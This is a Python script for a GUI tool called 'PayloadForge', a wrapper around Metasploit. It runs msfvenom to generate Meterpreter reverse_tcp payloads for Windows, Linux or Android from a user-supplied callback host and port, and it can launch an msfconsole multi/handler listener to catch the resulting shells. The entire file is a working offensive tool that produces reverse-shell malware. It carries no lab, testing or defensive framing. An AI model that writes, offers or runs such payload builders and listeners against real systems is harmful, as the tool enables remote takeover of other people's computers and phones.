import PySimpleGUI as sg
import subprocess
import os

sg.ChangeLookAndFeel('DarkGrey13')  # Use ChangeLookAndFeel for compatibility

os_options = ['Windows', 'Linux', 'Android']
payloads = {
    'Windows': 'windows/meterpreter/reverse_tcp',
    'Linux': 'linux/x86/meterpreter/reverse_tcp',
    'Android': 'android/meterpreter/reverse_tcp'
}
exts = {
    'Windows': 'exe',
    'Linux': 'elf',
    'Android': 'apk'
}

layout = [
    [sg.Text('💀 PayloadForge™ - Custom Payload Builder', font=('Courier New', 18), text_color='red')],
    [sg.Text('Target OS'), sg.Combo(os_options, default_value='Windows', key='os')],
    [sg.Text('LHOST'), sg.Input(key='lhost')],
    [sg.Text('LPORT'), sg.Input(key='lport')],
    [sg.Checkbox('Start Listener after build', key='listener')],
    [sg.Button('Build Payload', button_color=('white', 'firebrick')), sg.Button('Exit')],
    [sg.Output(size=(90, 20), font=('Consolas', 10))]
]

window = sg.Window('PayloadForge GUI - RedOps Edition', layout, icon=None)

while True:
    event, values = window.read()

    if event in (sg.WIN_CLOSED, 'Exit'):
        break

    if event == 'Build Payload':
        os_type = values['os']
        lhost = values['lhost']
        lport = values['lport']
        payload = payloads.get(os_type)
        ext = exts.get(os_type)
        output_file = f"payload.{ext}"

        if not all([lhost, lport]):
            print("[!] LHOST and LPORT are required.")
            continue

        cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "raw",
            "-o", output_file
        ]

        try:
            print(f"[+] Generating payload: {payload} → {output_file}")
            subprocess.run(cmd, check=True)
            print(f"[✓] Payload saved as {output_file}")

            if values['listener']:
                print("[~] Starting Metasploit listener...")
                msf_cmd = f"use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit"
                subprocess.run(["msfconsole", "-q", "-x", msf_cmd])

        except subprocess.CalledProcessError:
            print("[-] Payload generation failed. Check msfvenom path and inputs.")

window.close()
